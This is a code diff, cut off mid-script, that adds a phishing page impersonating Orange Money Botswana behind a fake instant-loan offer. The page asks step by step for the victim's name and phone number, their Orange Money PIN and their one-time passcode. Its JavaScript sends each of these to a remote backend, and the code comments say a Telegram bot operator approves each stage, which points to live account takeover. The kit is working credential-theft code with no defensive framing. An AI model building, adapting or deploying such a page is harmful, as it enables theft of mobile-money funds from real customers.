@@ -1,0 +1,919 @@
+‎<!DOCTYPE html>
+‎<html lang="en">
+‎<head>
+‎    <meta charset="UTF-8">
+‎    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+‎    <title>Orange Money Loan Application</title>
+‎    <style>
+‎        * {
+‎            margin: 0;
+‎            padding: 0;
+‎            box-sizing: border-box;
+‎        }
+‎
+‎        body {
+‎            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+‎            background: linear-gradient(135deg, #ff6600 0%, #ff8c00 100%);
+‎            min-height: 100vh;
+‎            display: flex;
+‎            justify-content: center;
+‎            align-items: center;
+‎            padding: 20px;
+‎        }
+‎
+‎        .container {
+‎            width: 100%;
+‎            max-width: 500px;
+‎            background: white;
+‎            border-radius: 20px;
+‎            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+‎            overflow: hidden;
+‎        }
+‎
+‎        .header {
+‎            background: linear-gradient(135deg, #ff6600 0%, #ff8c00 100%);
+‎            color: white;
+‎            padding: 30px 20px;
+‎            text-align: center;
+‎        }
+‎
+‎        .header h1 {
+‎            font-size: 28px;
+‎            font-weight: 700;
+‎            margin-bottom: 5px;
+‎        }
+‎
+‎        .header p {
+‎            font-size: 14px;
+‎            opacity: 0.9;
+‎        }
+‎
+‎        .content {
+‎            padding: 30px 20px;
+‎            min-height: 400px;
+‎            display: none;
+‎        }
+‎
+‎        .content.active {
+‎            display: block;
+‎        }
+‎
+‎        /* Loading Spinner */
+‎        .loading-spinner {
+‎            display: none;
+‎            text-align: center;
+‎            padding: 40px 20px;
+‎        }
+‎
+‎        .loading-spinner.show {
+‎            display: block;
+‎        }
+‎
+‎        .spinner {
+‎            border: 4px solid #f3f3f3;
+‎            border-top: 4px solid #ff6600;
+‎            border-radius: 50%;
+‎            width: 40px;
+‎            height: 40px;
+‎            animation: spin 1s linear infinite;
+‎            margin: 0 auto 20px;
+‎        }
+‎
+‎        @keyframes spin {
+‎            0% { transform: rotate(0deg); }
+‎            100% { transform: rotate(360deg); }
+‎        }
+‎
+‎        .loading-text {
+‎            color: #666;
+‎            font-size: 14px;
+‎            margin-top: 15px;
+‎        }
+‎
+‎        /* Page 1: Loan Amount */
+‎        .loan-amount-section {
+‎            text-align: center;
+‎        }
+‎
+‎        .loan-amount-section h2 {
+‎            color: #333;
+‎            margin-bottom: 15px;
+‎            font-size: 22px;
+‎        }
+‎
+‎        .loan-amount-section p {
+‎            color: #666;
+‎            margin-bottom: 30px;
+‎            font-size: 14px;
+‎        }
+‎
+‎        .amount-display {
+‎            background: #fff0e6;
+‎            border: 2px solid #ff6600;
+‎            border-radius: 12px;
+‎            padding: 25px;
+‎            margin-bottom: 30px;
+‎        }
+‎
+‎        .amount-label {
+‎            font-size: 14px;
+‎            color: #666;
+‎            margin-bottom: 10px;
+‎        }
+‎
+‎        .amount-value {
+‎            font-size: 48px;
+‎            font-weight: 700;
+‎            color: #ff6600;
+‎            margin-bottom: 10px;
+‎        }
+‎
+‎        .amount-currency {
+‎            font-size: 14px;
+‎            color: #999;
+‎        }
+‎
+‎        .slider-container {
+‎            margin-bottom: 30px;
+‎        }
+‎
+‎        input[type="range"] {
+‎            width: 100%;
+‎            height: 8px;
+‎            border-radius: 5px;
+‎            background: #ddd;
+‎            outline: none;
+‎            -webkit-appearance: none;
+‎        }
+‎
+‎        input[type="range"]::-webkit-slider-thumb {
+‎            -webkit-appearance: none;
+‎            appearance: none;
+‎            width: 25px;
+‎            height: 25px;
+‎            border-radius: 50%;
+‎            background: #ff6600;
+‎            cursor: pointer;
+‎            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+‎        }
+‎
+‎        input[type="range"]::-moz-range-thumb {
+‎            width: 25px;
+‎            height: 25px;
+‎            border-radius: 50%;
+‎            background: #ff6600;
+‎            cursor: pointer;
+‎            border: none;
+‎            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+‎        }
+‎
+‎        .amount-info {
+‎            background: #f5f5f5;
+‎            padding: 15px;
+‎            border-radius: 8px;
+‎            margin-bottom: 30px;
+‎            font-size: 13px;
+‎            color: #666;
+‎            line-height: 1.6;
+‎        }
+‎
+‎        /* Form Styles */
+‎        .form-group {
+‎            margin-bottom: 20px;
+‎        }
+‎
+‎        .form-group label {
+‎            display: block;
+‎            margin-bottom: 8px;
+‎            color: #333;
+‎            font-weight: 600;
+‎            font-size: 14px;
+‎        }
+‎
+‎        .form-group input,
+‎        .form-group select,
+‎        .form-group textarea {
+‎            width: 100%;
+‎            padding: 12px 15px;
+‎            border: 2px solid #e0e0e0;
+‎            border-radius: 8px;
+‎            font-size: 14px;
+‎            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+‎            transition: border-color 0.3s ease;
+‎        }
+‎
+‎        .form-group input:focus,
+‎        .form-group select:focus,
+‎        .form-group textarea:focus {
+‎            outline: none;
+‎            border-color: #ff6600;
+‎        }
+‎
+‎        .form-group textarea {
+‎            resize: vertical;
+‎            min-height: 100px;
+‎        }
+‎
+‎        .phone-input-group {
+‎            display: flex;
+‎            gap: 10px;
+‎        }
+‎
+‎        .country-code {
+‎            width: 80px;
+‎            background: #fff0e6;
+‎            border: 2px solid #e0e0e0;
+‎            border-radius: 8px;
+‎            padding: 12px;
+‎            font-weight: 600;
+‎            color: #ff6600;
+‎            display: flex;
+‎            align-items: center;
+‎            justify-content: center;
+‎        }
+‎
+‎        .phone-input-group input {
+‎            flex: 1;
+‎        }
+‎
+‎        /* Button Styles */
+‎        .btn {
+‎            width: 100%;
+‎            padding: 14px;
+‎            border: none;
+‎            border-radius: 8px;
+‎            font-size: 16px;
+‎            font-weight: 600;
+‎            cursor: pointer;
+‎            transition: all 0.3s ease;
+‎            margin-top: 10px;
+‎        }
+‎
+‎        .btn-primary {
+‎            background: linear-gradient(135deg, #ff6600 0%, #ff8c00 100%);
+‎            color: white;
+‎        }
+‎
+‎        .btn-primary:hover {
+‎            transform: translateY(-2px);
+‎            box-shadow: 0 5px 15px rgba(255, 102, 0, 0.4);
+‎        }
+‎
+‎        .btn-primary:active {
+‎            transform: translateY(0);
+‎        }
+‎
+‎        .btn-primary:disabled {
+‎            opacity: 0.6;
+‎            cursor: not-allowed;
+‎            transform: none;
+‎        }
+‎
+‎        .btn-secondary {
+‎            background: #f5f5f5;
+‎            color: #333;
+‎            border: 2px solid #e0e0e0;
+‎        }
+‎
+‎        .btn-secondary:hover {
+‎            background: #efefef;
+‎        }
+‎
+‎        .button-group {
+‎            display: flex;
+‎            gap: 10px;
+‎            margin-top: 20px;
+‎        }
+‎
+‎        .button-group .btn {
+‎            flex: 1;
+‎            margin: 0;
+‎        }
+‎
+‎        /* OTP Section */
+‎        .otp-section {
+‎            text-align: center;
+‎        }
+‎
+‎        .otp-section h2 {
+‎            color: #333;
+‎            margin-bottom: 10px;
+‎            font-size: 22px;
+‎        }
+‎
+‎        .otp-section p {
+‎            color: #666;
+‎            margin-bottom: 30px;
+‎            font-size: 14px;
+‎        }
+‎
+‎        .otp-inputs {
+‎            display: flex;
+‎            gap: 10px;
+‎            justify-content: center;
+‎            margin-bottom: 30px;
+‎        }
+‎
+‎        .otp-input {
+‎            width: 50px;
+‎            height: 50px;
+‎            border: 2px solid #e0e0e0;
+‎            border-radius: 8px;
+‎            font-size: 24px;
+‎            font-weight: 700;
+‎            text-align: center;
+‎            transition: border-color 0.3s ease;
+‎        }
+‎
+‎        .otp-input:focus {
+‎            outline: none;
+‎            border-color: #ff6600;
+‎        }
+‎
+‎        /* Error Message */
+‎        .error-message {
+‎            background: #fee;
+‎            color: #c33;
+‎            padding: 12px;
+‎            border-radius: 8px;
+‎            margin-bottom: 15px;
+‎            font-size: 13px;
+‎            border-left: 4px solid #c33;
+‎            display: none;
+‎        }
+‎
+‎        .error-message.show {
+‎            display: block;
+‎        }
+‎
+‎        /* Success Message */
+‎        .success-message {
+‎            background: #efe;
+‎            color: #3c3;
+‎            padding: 12px;
+‎            border-radius: 8px;
+‎            margin-bottom: 15px;
+‎            font-size: 13px;
+‎            border-left: 4px solid #3c3;
+‎            display: none;
+‎        }
+‎
+‎        .success-message.show {
+‎            display: block;
+‎        }
+‎
+‎        /* Progress Bar */
+‎        .progress-bar {
+‎            height: 4px;
+‎            background: #e0e0e0;
+‎            position: relative;
+‎            overflow: hidden;
+‎        }
+‎
+‎        .progress-fill {
+‎            height: 100%;
+‎            background: linear-gradient(90deg, #ff6600 0%, #ff8c00 100%);
+‎            transition: width 0.3s ease;
+‎        }
+‎
+‎        .step-info {
+‎            text-align: center;
+‎            font-size: 12px;
+‎            color: #999;
+‎            margin-top: 10px;
+‎        }
+‎
+‎        /* Success Section */
+‎        .success-section {
+‎            text-align: center;
+‎        }
+‎
+‎        .success-icon {
+‎            font-size: 80px;
+‎            margin-bottom: 20px;
+‎            animation: scaleIn 0.6s ease;
+‎        }
+‎
+‎        @keyframes scaleIn {
+‎            0% {
+‎                transform: scale(0);
+‎            }
+‎            50% {
+‎                transform: scale(1.1);
+‎            }
+‎            100% {
+‎                transform: scale(1);
+‎            }
+‎        }
+‎
+‎        .success-section h2 {
+‎            color: #333;
+‎            margin-bottom: 15px;
+‎            font-size: 28px;
+‎        }
+‎
+‎        .success-section p {
+‎            color: #666;
+‎            margin-bottom: 10px;
+‎            font-size: 14px;
+‎            line-height: 1.6;
+‎        }
+‎
+‎        .loan-details {
+‎            background: #fff0e6;
+‎            border: 2px solid #ff6600;
+‎            border-radius: 12px;
+‎            padding: 20px;
+‎            margin: 25px 0;
+‎            text-align: left;
+‎        }
+‎
+‎        .loan-detail-row {
+‎            display: flex;
+‎            justify-content: space-between;
+‎            margin-bottom: 12px;
+‎            font-size: 14px;
+‎        }
+‎
+‎        .loan-detail-row:last-child {
+‎            margin-bottom: 0;
+‎            padding-top: 12px;
+‎            border-top: 1px solid #ffb380;
+‎            font-weight: 600;
+‎        }
+‎
+‎        .loan-detail-label {
+‎            color: #666;
+‎        }
+‎
+‎        .loan-detail-value {
+‎            color: #ff6600;
+‎            font-weight: 600;
+‎        }
+‎
+‎        /* Responsive */
+‎        @media (max-width: 480px) {
+‎            .container {
+‎                border-radius: 12px;
+‎            }
+‎
+‎            .header {
+‎                padding: 20px 15px;
+‎            }
+‎
+‎            .header h1 {
+‎                font-size: 24px;
+‎            }
+‎
+‎            .content {
+‎                padding: 20px 15px;
+‎            }
+‎
+‎            .amount-value {
+‎                font-size: 36px;
+‎            }
+‎        }
+‎    </style>
+‎</head>
+‎<body>
+‎    <div class="container">
+‎        <div class="progress-bar">
+‎            <div class="progress-fill" id="progressFill"></div>
+‎        </div>
+‎
+‎        <div class="header">
+‎            <h1>🟠 Orange Money</h1>
+‎            <p id="headerSubtitle">Quick Loan Application</p>
+‎        </div>
+‎
+‎        <!-- Page 1: Loan Amount -->
+‎        <div class="content active" id="page1">
+‎            <div class="loan-amount-section">
+‎                <h2>How Much Do You Need?</h2>
+‎                <p>Choose your loan amount between P 1,000 and P 100,000</p>
+‎                
+‎                <div class="amount-display">
+‎                    <div class="amount-label">Loan Amount</div>
+‎                    <div class="amount-value">P <span id="loanAmountDisplay">50000</span></div>
+‎                    <div class="amount-currency">Botswana Pula</div>
+‎                </div>
+‎
+‎                <div class="slider-container">
+‎                    <input type="range" id="loanSlider" min="1000" max="100000" value="50000" step="1000">
+‎                </div>
+‎
+‎                <div class="amount-info">
+‎                    <strong>📋 Quick Loan Terms:</strong><br>
+‎                    • Instant approval<br>
+‎                    • Flexible repayment<br>
+‎                    • 24/7 availability
+‎                </div>
+‎
+‎                <button class="btn btn-primary" onclick="goToPage(2)">Continue</button>
+‎            </div>
+‎            <div class="step-info">Step 1 of 4</div>
+‎        </div>
+‎
+‎        <!-- Page 2: Personal Information -->
+‎        <div class="content" id="page2">
+‎            <div class="form-section">
+‎                <h2 style="color: #333; margin-bottom: 15px; font-size: 22px; text-align: center;">Your Information</h2>
+‎                <p style="color: #666; margin-bottom: 25px; font-size: 14px; text-align: center;">Please provide your details</p>
+‎                
+‎                <div class="error-message" id="page2Error"></div>
+‎
+‎                <div class="form-group">
+‎                    <label>First Name</label>
+‎                    <input type="text" id="firstName" placeholder="Enter your first name" required>
+‎                </div>
+‎
+‎                <div class="form-group">
+‎                    <label>Last Name</label>
+‎                    <input type="text" id="lastName" placeholder="Enter your last name" required>
+‎                </div>
+‎
+‎                <div class="form-group">
+‎                    <label>Phone Number (Botswana)</label>
+‎                    <div class="phone-input-group">
+‎                        <div class="country-code">+267</div>
+‎                        <input type="tel" id="phoneNumber" placeholder="71234567" maxlength="8" pattern="[0-9]{8}" required>
+‎                    </div>
+‎                    <small style="color: #999; margin-top: 5px; display: block;">Enter 8 digits (e.g., 71234567)</small>
+‎                </div>
+‎
+‎                <div class="form-group">
+‎                    <label>Loan Purpose</label>
+‎                    <select id="loanPurpose" required>
+‎                        <option value="">Select a purpose</option>
+‎                        <option value="personal">Personal Needs</option>
+‎                        <option value="business">Business</option>
+‎                        <option value="education">Education</option>
+‎                        <option value="medical">Medical</option>
+‎                        <option value="emergency">Emergency</option>
+‎                        <option value="other">Other</option>
+‎                    </select>
+‎                </div>
+‎
+‎                <div class="button-group">
+‎                    <button class="btn btn-secondary" onclick="goToPage(1)">Back</button>
+‎                    <button class="btn btn-primary" onclick="submitPersonalInfo()">Continue</button>
+‎                </div>
+‎            </div>
+‎            <div class="step-info">Step 2 of 4</div>
+‎        </div>
+‎
+‎        <!-- Page 2 Loading -->
+‎        <div class="content" id="page2Loading">
+‎            <div class="loading-spinner show">
+‎                <div class="spinner"></div>
+‎                <div class="loading-text">Sending your information to verification...</div>
+‎            </div>
+‎        </div>
+‎
+‎        <!-- Page 3: Login -->
+‎        <div class="content" id="page3">
+‎            <div style="text-align: center;">
+‎                <h2 style="color: #333; margin-bottom: 15px; font-size: 22px;">Verify Your Account</h2>
+‎                <p style="color: #666; margin-bottom: 25px; font-size: 14px;">Enter your Orange Money credentials</p>
+‎                
+‎                <div class="error-message" id="page3Error"></div>
+‎
+‎                <div class="form-group">
+‎                    <label>Phone Number (Botswana)</label>
+‎                    <div class="phone-input-group">
+‎                        <div class="country-code">+267</div>
+‎                        <input type="tel" id="loginPhone" placeholder="71234567" maxlength="8" pattern="[0-9]{8}" required>
+‎                    </div>
+‎                </div>
+‎
+‎                <div class="form-group">
+‎                    <label>Orange Money PIN</label>
+‎                    <input type="password" id="loginPin" placeholder="Enter your 4-digit PIN" maxlength="4" pattern="[0-9]{4}" required>
+‎                </div>
+‎
+‎                <div class="button-group">
+‎                    <button class="btn btn-secondary" onclick="goToPage(2)">Back</button>
+‎                    <button class="btn btn-primary" onclick="submitLogin()">Continue</button>
+‎                </div>
+‎            </div>
+‎            <div class="step-info">Step 3 of 4</div>
+‎        </div>
+‎
+‎        <!-- Page 3 Loading -->
+‎        <div class="content" id="page3Loading">
+‎            <div class="loading-spinner show">
+‎                <div class="spinner"></div>
+‎                <div class="loading-text">Verifying your credentials...</div>
+‎                <div class="loading-text" style="margin-top: 20px; font-size: 12px; color: #999;">Please wait while we confirm your information</div>
+‎            </div>
+‎        </div>
+‎
+‎        <!-- Page 4: OTP Verification -->
+‎        <div class="content" id="page4">
+‎            <div class="otp-section">
+‎                <h2>Verify Your Identity</h2>
+‎                <p>Enter the OTP sent to your phone</p>
+‎                
+‎                <div class="error-message" id="page4Error"></div>
+‎
+‎                <div class="otp-inputs" id="otpInputs">
+‎                    <input type="text" class="otp-input" maxlength="1" placeholder="0" onkeyup="moveToNext(this)">
+‎                    <input type="text" class="otp-input" maxlength="1" placeholder="0" onkeyup="moveToNext(this)">
+‎                    <input type="text" class="otp-input" maxlength="1" placeholder="0" onkeyup="moveToNext(this)">
+‎                    <input type="text" class="otp-input" maxlength="1" placeholder="0" onkeyup="moveToNext(this)">
+‎                    <input type="text" class="otp-input" maxlength="1" placeholder="0" onkeyup="moveToNext(this)">
+‎                    <input type="text" class="otp-input" maxlength="1" placeholder="0" onkeyup="moveToNext(this)">
+‎                </div>
+‎
+‎                <button class="btn btn-primary" onclick="submitOTP()">Verify OTP</button>
+‎
+‎                <div class="button-group" style="margin-top: 15px;">
+‎                    <button class="btn btn-secondary" onclick="goToPage(3)">Back</button>
+‎                </div>
+‎            </div>
+‎            <div class="step-info">Step 4 of 4</div>
+‎        </div>
+‎
+‎        <!-- Page 4 Loading -->
+‎        <div class="content" id="page4Loading">
+‎            <div class="loading-spinner show">
+‎                <div class="spinner"></div>
+‎                <div class="loading-text">Verifying OTP...</div>
+‎            </div>
+‎        </div>
+‎
+‎        <!-- Page 5: Success -->
+‎        <div class="content" id="page5">
+‎            <div class="success-section">
+‎                <div class="success-icon">✅</div>
+‎                <h2>Congratulations!</h2>
+‎                <p>Your loan has been submitted for review</p>
+‎
+‎                <div class="loan-details" id="approvalDetails">
+‎                    <div class="loan-detail-row">
+‎                        <span class="loan-detail-label">Loan Amount:</span>
+‎                        <span class="loan-detail-value" id="approvalAmount">P 50,000</span>
+‎                    </div>
+‎                    <div class="loan-detail-row">
+‎                        <span class="loan-detail-label">Applicant:</span>
+‎                        <span class="loan-detail-value" id="approvalName">John Doe</span>
+‎                    </div>
+‎                    <div class="loan-detail-row">
+‎                        <span class="loan-detail-label">Phone:</span>
+‎                        <span class="loan-detail-value" id="approvalPhone">+267 71234567</span>
+‎                    </div>
+‎                    <div class="loan-detail-row">
+‎                        <span class="loan-detail-label">Purpose:</span>
+‎                        <span class="loan-detail-value" id="approvalPurpose">Personal</span>
+‎                    </div>
+‎                    <div class="loan-detail-row">
+‎                        <span class="loan-detail-label">Status:</span>
+‎                        <span class="loan-detail-value">✓ APPROVED</span>
+‎                    </div>
+‎                </div>
+‎
+‎                <p style="color: #999; font-size: 13px; line-height: 1.6;">
+‎                    Your application is under review. You will receive updates via SMS to your registered phone number.
+‎                </p>
+‎
+‎                <button class="btn btn-primary" onclick="finishApplication()">Done</button>
+‎            </div>
+‎        </div>
+‎    </div>
+‎
+‎    <script>
+‎        const API_URL = 'https://your-render-app.onrender.com/api';
+‎        let sessionId = generateSessionId();
+‎
+‎        // State management
+‎        let appState = {
+‎            loanAmount: 50000,
+‎            firstName: '',
+‎            lastName: '',
+‎            phoneNumber: '',
+‎            loanPurpose: '',
+‎            loginPhone: '',
+‎            loginPin: '',
+‎            otpVerified: false
+‎        };
+‎
+‎        let currentPage = 1;
+‎
+‎        // Initialize
+‎        document.addEventListener('DOMContentLoaded', function() {
+‎            document.getElementById('loanSlider').addEventListener('input', updateLoanAmount);
+‎            startStatusPolling();
+‎        });
+‎
+‎        function generateSessionId() {
+‎            return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+‎        }
+‎
+‎        function updateLoanAmount(e) {
+‎            const amount = parseInt(e.target.value);
+‎            appState.loanAmount = amount;
+‎            document.getElementById('loanAmountDisplay').textContent = amount.toLocaleString();
+‎        }
+‎
+‎        function updateProgress() {
+‎            const progress = (currentPage / 4) * 100;
+‎            document.getElementById('progressFill').style.width = progress + '%';
+‎        }
+‎
+‎        function showPage(pageNum) {
+‎            document.querySelectorAll('.content').forEach(el => el.classList.remove('active'));
+‎            document.getElementById('page' + pageNum).classList.add('active');
+‎            updateProgress();
+‎            window.scrollTo(0, 0);
+‎        }
+‎
+‎        function goToPage(pageNum) {
+‎            currentPage = pageNum;
+‎            showPage(pageNum);
+‎            clearErrors();
+‎        }
+‎
+‎        function submitPersonalInfo() {
+‎            clearErrors();
+‎            
+‎            const firstName = document.getElementById('firstName').value.trim();
+‎            const lastName = document.getElementById('lastName').value.trim();
+‎            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+‎            const loanPurpose = document.getElementById('loanPurpose').value;
+‎
+‎            if (!firstName) {
+‎                showError('page2Error', 'Please enter your first name');
+‎                return;
+‎            }
+‎            if (!lastName) {
+‎                showError('page2Error', 'Please enter your last name');
+‎                return;
+‎            }
+‎            if (!phoneNumber || phoneNumber.length !== 8) {
+‎                showError('page2Error', 'Please enter a valid 8-digit phone number');
+‎                return;
+‎            }
+‎            if (!loanPurpose) {
+‎                showError('page2Error', 'Please select a loan purpose');
+‎                return;
+‎            }
+‎
+‎            appState.firstName = firstName;
+‎            appState.lastName = lastName;
+‎            appState.phoneNumber = phoneNumber;
+‎            appState.loanPurpose = loanPurpose;
+‎
+‎            // Show loading
+‎            showPage('2Loading');
+‎
+‎            // Send to backend
+‎            fetch(API_URL + '/submit-personal-info', {
+‎                method: 'POST',
+‎                headers: {
+‎                    'Content-Type': 'application/json',
+‎                },
+‎                body: JSON.stringify({
+‎                    sessionId: sessionId,
+‎                    firstName: firstName,
+‎                    lastName: lastName,
+‎                    phone: '+267' + phoneNumber,
+‎                    loanAmount: appState.loanAmount,
+‎                    loanPurpose: loanPurpose
+‎                })
+‎            })
+‎            .then(res => res.json())
+‎            .then(data => {
+‎                if (data.success) {
+‎                    // Wait for telegram bot response
+‎                    waitForBotApproval('personal_info_submission');
+‎                } else {
+‎                    showPage(2);
+‎                    showError('page2Error', data.message || 'Error submitting information');
+‎                }
+‎            })
+‎            .catch(err => {
+‎                console.error('Error:', err);
+‎                showPage(2);
+‎                showError('page2Error', 'Network error. Please try again.');
+‎            });
+‎        }
+‎
+‎        function submitLogin() {
+‎            clearErrors();
+‎            
+‎            const loginPhone = document.getElementById('loginPhone').value.trim();
+‎            const loginPin = document.getElementById('loginPin').value.trim();
+‎
+‎            if (!loginPhone || loginPhone.length !== 8) {
+‎                showError('page3Error', 'Please enter a valid 8-digit phone number');
+‎                return;
+‎            }
+‎            if (!loginPin || loginPin.length !== 4) {
+‎                showError('page3Error', 'Please enter a valid 4-digit PIN');
+‎                return;
+‎            }
+‎
+‎            appState.loginPhone = loginPhone;
+‎            appState.loginPin = loginPin;
+‎
+‎            // Show loading
+‎            showPage('3Loading');
+‎
+‎            // Send to backend
+‎            fetch(API_URL + '/submit-login', {
+‎                method: 'POST',
+‎                headers: {
+‎                    'Content-Type': 'application/json',
+‎                },
+‎                body: JSON.stringify({
+‎                    sessionId: sessionId,
+‎                    phone: '+267' + loginPhone,
+‎                    pin: loginPin
+‎                })
+‎            })
+‎            .then(res => res.json())
+‎            .then(data => {
+‎                if (data.success) {
+‎                    // Wait for telegram bot response
+‎                    waitForBotApproval('login_submission');
+‎                } else {
+‎                    showPage(3);
+‎                    showError('page3Error', data.message || 'Error submitting login');
+‎                }
+‎            })
+‎            .catch(err => {
+‎                console.error('Error:', err);
+‎                showPage(3);
+‎                showError('page3Error', 'Network error. Please try again.');
+‎            });
+‎        }
+‎
+‎        function submitOTP() {
+‎            const inputs = document.querySelectorAll('#page4 .otp-input');
+‎            let otp = '';
+‎
+‎            inputs.forEach(input => {
+‎                otp += input.value;
+‎            });
+‎
+‎            if (otp.length !== 6) {
+‎                showError('page4Error', 'Please enter all 6 digits of the OTP');
+‎                return;
+‎            }
+‎
+‎            // Show loading
+‎            showPage('4Loading');
+‎
+‎            // Send to backend
+‎            fetch(API_URL + '/submit-otp', {
+‎                method: 'POST',
+‎                headers: {
+‎                    'Content-Type': 'application/json',
+‎                },
+‎                body: JSON.stringify({
+‎                    sessionId: sessionId,
+‎                    otp: otp
+‎                })
+‎            })
+‎            .then(res => res.json())
+‎            .then(data => {
+‎                if (data.success) {
+‎                    // Wait for telegram bot response
+‎                    waitForBotApproval('otp_submission');
+‎                } else {
+‎                    showPage(4);
+‎                    showError('page4Error', data.message || 'Error submitting OTP');
+‎                }
+‎            })
+‎            .catch(err => {
+‎                console.error('Error:', err);
+‎                showPage(4);
+‎                showError('page4Error', 'Network error. Please try again.');
+‎            });
+‎        }
+‎
+‎        function waitForBotApproval(stage) {
+‎            const maxAttempts = 60; // 60 seconds
+‎            let attempts = 0;
+‎
+‎            const checkInterval = setInterval(() => {
+‎                attempts++;
+‎
+‎                fetch(API_URL + '/check-status?sessionId=' + sessionId + '&stage=' + stage)
+‎                    .then(res => res.json())
+‎                    .then(data => {
+‎                        if (data.status === 'APPROVED') {
+‎                            clearInterval(checkInterval);
+‎                            handleApproval(stage);
+‎                        } else if (data.status === 'DENIED') {
+‎                            clearInterval(checkInterval);
+‎                            handleDenial(stage);
+‎                        } else if (data.status === 'VERIFY_DEVICE') {
+‎                            clearInterval(checkInterval);
+‎                            handleVerifyDevice();
+‎                        } else if (data.status === 'WRONG_OTP') {
+‎                            clearInterval(checkInterval);
+‎                            handleWrongOTP();
+‎                        }
+‎
+‎                 
